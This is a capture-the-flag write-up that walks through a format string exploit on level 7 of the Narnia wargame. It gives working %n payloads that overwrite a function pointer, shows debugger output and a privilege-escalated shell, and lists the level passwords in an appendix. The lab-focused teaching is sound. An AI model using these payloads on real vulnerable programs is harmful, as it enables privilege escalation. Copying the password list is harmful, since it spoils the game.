# Exploiting a format string vulnerability

### Introduction

This paper details how and why a format string attack works. The exploit will be demonstrated on a specific webserver, which hosts a "Capture The Flag" (CTF) wargame. A CTF wargame is a collection of exploit related puzzles you solve to collect "flags".
The particular wargame I have chosen to deal with  is called  [Narnia](https://overthewire.org/wargames/narnia/). The game consists of 9 levels in ascending difficulty, which teaches you about stack smashing, return to libc attacks and format string attacks. I have solved all levels, but I have decided to focus on a single level to keep the explanation of the exploit brief and to the point. Passwords for all the levels can be found in the appendix.

### The Narnia environment

Modern distributions and compilers try to reduce risks  in relation to running executable files. The most prominent counter measures are.

- Address Space Layout Randomization (ASLR). This will cause memory segments to randomly shift position between executions of the program.
- Data Execution Prevention (DEP). If the NX-bit for the executable is set, then instructions residing on the stack are not allowed to be executed.
- Stack canaries. To ensure the stack has not been corrupted you - upon entering a function - push a known value after the return address. Before the function returns you check that the value has not changed.

 Although there are workarounds to these defences, they have have all been disabled on the Narnia server. This is because Narnia is an entry level wargame.

## Getting started

You begin by ssh'ing into the narnia webserver. Each level contains an executable file along with the source code which it was compiled from. The executable is owned by the user of the next level. In the following terminal dump we ssh into the server and take a look at the permissions of the files at hand.

```
➜  ~ ssh narnia7@narnia.labs.overthewire.org -p 2226
narnia7@narnia:~$ ls -l /narnia/narnia7*
-r-sr-x--- 1 narnia8 narnia7 6532 Aug 26 22:35 /narnia/narnia7	
-r--r----- 1 narnia7 narnia7 1964 Aug 26 22:35 /narnia/narnia7.c
```
We see that the executable has the *suid* attribute set. In the case where we are logged in as "narnia7", we actually get to execute the program with the privileges of "narnia8". Our objective is to spawn a shell from within this program.

### Format string vulnerability
 A format string is a string which contains special format specifiers. In the C programming language it is used together with the family of *printf* functions. In brief the vulnerability occurs when a programmer carelessly uses printf with missing arguments - allowing a hacker to input format specifiers. This is also described under the “BUGS” section in the printf man page, as seen in the following citation:

> 	Code such as **printf(foo)**; often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and **creating a security hole.**

To illustrate the format string explot we will undertake level 7 of the narnia wargame. The source code "narnia7.c" for this level can be seen in the appendix.

### Building the foundation

Level 7 of the Narnia wargame can be solved by using a format string attack. The program contains four functions: `main()`, `vuln()`, `goodfunction()` and `hackedfunction()`. The vulnerable function *vuln()* will under normal circumstances redirect execution into *goodfunction()*. 
The objective is to instead enter the *hackedfunction()*, which will launch a shell with higher privileges. 
In *vuln()* two local variables are declared, a character buffer (**buffer**) and a function pointer (**int (\*ptr)()**). 
The function pointer is set to equal the address of the *goodfunction()*. Right before returning into *goodfunction()* a call to *snprintf* is made. This is the interesting bit. snprintf works like its cousin printf, but instead of printing to std out it prints to a buffer - and i prints at most n bytes. 
The call:  ```snprintf(buffer, sizeof buffer, format);``` is a security hole, since no additional arguments are provided - and therefore the format variable can contain format specifiers. Once snprintf executes the stack will look roughly like in the figure below. 

![stackview.png](https://www.dropbox.com/s/pe5b8jlgfaopi46/stackview.png?dl=0&raw=1)

Because the function arguments are pushed initially - and in reverse order - the snprintf function will expect the first format substitution argument to be where the function pointer resides. The next argument will be grabbed from the beginning of the buffer - which is also currently being printed to by snprintf. 

### Level 7 testing

The result of running the narnia7 executable with a benevolent input can be seen below.

```
narnia7@narnia:/narnia$ ./narnia7 AAAA
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd568)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```
The creator of the wargame has been nice enough to provide the addresses of the good and hacked function - as well as the location of the function pointer in memory. 
Let’s try to see what happens if we input a format string. Because snprintf doesn’t print to stdout we will have to look at this within a debugger to find out what is going on.
The terminal dump below comes from gdb with an extension called “peda”.
``` 
gdb-peda$ break *vuln+154
Breakpoint 1 at 0x80486b5
gdb-peda$ run %x
Starting program: /narnia/narnia7 %x

[-------------------------------------code-------------------------------------]
   0x80486ac <vuln+145>:	push   eax
   0x80486ad <vuln+146>:	call   0x8048500 <snprintf@plt>
   0x80486b2 <vuln+151>:	add    esp,0xc
=> 0x80486b5 <vuln+154>:	mov    eax,DWORD PTR [ebp-0x84]
   0x80486bb <vuln+160>:	call   eax
   0x80486bd <vuln+162>:	leave  
   0x80486be <vuln+163>:	ret    
   0x80486bf <main>:	push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xffffd538 --> 0x80486ff (<goodfunction>:	push   ebp)  #This is the function pointer
0004| 0xffffd53c ("80486ff")								 #This is the beginning of the buffer
0008| 0xffffd540 --> 0x666636 ('6ff')
0012| 0xffffd544 --> 0x0 
```
 A breakpoint has been hit right after the call to snprintf and the stack clean up (add esp, 0xc). Below the code section, peda has provided a short stack dump. 
At the top of the stack (lowest memory address) we find as expected the function pointer which currently points to *goodfunction()*. Below it the buffer resides, which now contains the leaked address of good function printed as ascii characters.
To overwrite the value a buffer must be constructed. It should hold the address of the function pointer, then some fill payload and finally a format specifier %n to write to the address. With python we can quickly construct inputs containing non ascii printable characters like so:
```
narnia7@narnia:/narnia$ python -c 'print "\xff\xff\xff\xff"+"FILL"+"%n"'
����FILL%n
```

The address of the function pointer contains 8 ascii characters. This length plus the length of the dummy fill would be written to the function pointer. If the previous python command was used as input to the narnia7 program, then we would overwrite the function pointer with the value 12. This causes a segmentation fault and stops the program. The buffer is only 128 characters long, so how can we ever write 0x8048724 (address of hacked function) characters into the function pointer?
A trick is to abuse the field width of the format specifier. The field width is specified in decimal and prints spaces or 0’s depending on the format. Inputting e.g. *%010x* would print the corresponding argument prepending zeros until a field width of 10 is reached. 

Subtracting the four characters already written from the hacked function address and using this number as the field width successfully redirects us into hackedfunction(). In the terminal dump below, the desired field width is calculated. This successfully spawns the shell and elevates our permissions to those of narnia8. The password for the next level can then be found by reading the /etc/narnia_pass/narnia8 file.

```
narnia7@narnia:/narnia$ python -c 'result = 0x8048724-0x4; print result'
134514464
narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x58\xd5\xff\xff" + "%0134514464x" + "%n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd558)
I guess you want to come to the hackedfunction...
Way to go!!!!$ id
uid=14008(narnia8) gid=14007(narnia7) groups=14007(narnia7)
$ cat /etc/narnia_pass/narnia8
mohthuphog
```
A few things are going on in the above terminal dump. We first use python to find the decimal value of the needed padding. Then the address of the function pointer is input. This must be done in reverse order, because the machine which runs the executable has an x86 processor with little-endian, meaning the least significant byte comes first in memory. 
### A more consistent way
Directly writing the address with a single field width specifier is nice, but also comes with limitations. The maximum amount of characters we can write with the field width operator is around 200 millions, meaning if the address of hacked function had been '0xbebc200' (200 million) or above we could not have used this approach. Then what do you do?
Instead of writing the entire value into the address in one go, it can be split into four writes. This is done by writing into each byte of the address individually. We construct an input buffer as seen in the figure below.

The arrows indicates the value *%x* will fetch from the buffer. The value will be converted into a string with hexadecimal numbers, and then printed back into buffer. The first *%x* fetches the value of the function pointer. 
```bash
+----------Fetches function pointer value--------------------------+
|                                                                  |
|                                     +------------------------------------------+
|                                     |                            |             |
v  +-----------------+------+------+--v---+------+------+------+---+--+------+---+--+------+
   |                 |      |      |      |      |      |      |      |      |      |      |
   |Base address(BA) | JUNK | BA+1 | JUNK | BA+2 | JUNK | BA+3 | %x%n | %x%n | %x%n | %x%n |
   |                 |      |      |      |      |      |      |      |      |      |      |
   +-----------------+---^--+------+------+------+---^--+------+------+---+--+------+---+--+
                         |                           |                    |             |
                         |                           +----------------------------------+
                         |                                                |
                         +------------------------------------------------+
```

The desired address to be written into the function pointer is **0x08048724**. Because of little-endianness we first must write 0x24 into the base address. Before the first *%x* we have already written 28 bytes to the buffer. This means an additional 0x24-28=8 bytes should be written before doing the %n. Next 0x87 needs to be written, so the field width of the next fetched unsigned integer (which is what you get when you do %x in a printf statement) should equal 0x87-0x24.Once this is done an interesting problem occurs.
We need to write just 0x04 into the next byte, but 0x87 bytes have already been written. The solution is to wrap around to 0x104, meaning a field width of 0x104-0x87 is needed. The same trick is applied for the last byte, where the written value will be 0x208.
The terminal dump below shows the process as well as the specific input required.
```
narnia7@narnia:/narnia$ python
Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
>>> 0x24-28
8
>>> 0x87-0x24
99
>>> 0x104-0x87
125
>>> 0x208-0x104
260
narnia7@narnia:/narnia$ ./narnia7 "$(python -c 'print "\x08\xd5\xff\xff" "JUNK" "\x09\xd5\xff\xff" "JUNK" "\x0a\xd5\xff\xff" "JUNK" "\x0b\xd5\xff\xff""%8x%n" "%99x%n" "%125x%n" "%260x%n"')"
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd538)
I guess you want to come to the hackedfunction...
Way to go!!!!$ 
```
Lastly I will mention a small detail, which for a long time left me puzzled. When inputting the argument into the program, it is necessary to quote the entire argument. The function pointer resides at an address, which has ascii control characters in it. E.g. 0x09 will be interpreted as a tab by bash and will split the supplied argument (meaning everything to the right of the tab will be in argv[2]). 
### Printf is still dangerous
The code from level 7 is obviously not a real world example. It is deliberately made to be vulnerable. It does however highlight the dangers of carelessly using the printf function. In level 7 snprintf was used to redirect program execution directly into a function which spawned a shell. The level had ASLR, DEP and stack canaries disabled to make it more managable.
However a printf vulnerability can actually  be used for bypassing these defences. Through a printf security hole, one can leak the stack canary value at runtime, and also leak where libc functions reside in memory. Leaking memory addresses can defeat ASLR. Returning into libc defeats DEP.  Unsurprisingly knowing the canary beats the stack canary check.

## Appendix

 **`narnia7.c`**
```C
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

### Passwords

* level1: efeidiedae
* level2: nairiepecu
* level3: vaequeezee
* level4: thaenohtai
* level5: faimahchiy
* level6: neezocaeng
* level7: ahkiaziphu
* level8: mohthuphog
* level9: eiL5fealae

